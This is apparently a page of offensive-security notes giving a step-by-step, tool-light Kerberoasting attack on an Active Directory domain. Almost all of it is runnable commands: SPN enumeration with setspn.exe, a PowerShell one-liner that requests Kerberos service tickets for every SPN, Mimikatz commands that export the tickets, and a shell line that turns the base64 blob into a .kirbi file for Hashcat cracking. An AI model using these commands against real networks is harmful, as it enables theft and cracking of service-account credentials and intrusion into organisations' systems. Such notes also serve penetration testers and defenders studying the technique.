---
description: >-
  Usually we would be doing kerberoasting with tools, but sometimes we don't
  have access to them, so this is more minimalistic approach.
---

# Semi-Manual Way

## <mark style="color:yellow;">**Enumerating SPNs with setspn.exe**</mark>

```powershell
C:\> setspn.exe -Q */*
```

## <mark style="color:yellow;">**Targeting a single user**</mark>

```powershell
PS C:\> Add-Type -AssemblyName System.IdentityModel

PS C:\> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/NC.militech.local:1433"
```

## <mark style="color:yellow;">**Retrieve all tickets with setspn.exe**</mark>

```powershell
PS C:\> setspn.exe -T MILITECH.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

With this two commands we are:

1. Load necessary .NET classes (<mark style="color:blue;">`Add-Type`</mark>).
2. Create an object for Kerberos authentication (<mark style="color:blue;">`New-Object`</mark>).
3. The object requests a **TGS ticket** for the given service.
4. The ticket is stored **in memory** under that object.

## <mark style="color:yellow;">Extract Tickets with Mimikatz</mark>

```markup
mimikatz # base64 /out:true

mimikatz # kerberos::list /export  

// If we do not use base64 out true command, mimikatz will put tickets in .kirbi file.
```

#### Base64 Blob Processing

```bash
echo "<base64 blob>" | tr -d \\n | base64 -d > sqldev.kirbi
```

Then go to Hashcat section in main Kerberoasting section and crack it.&#x20;
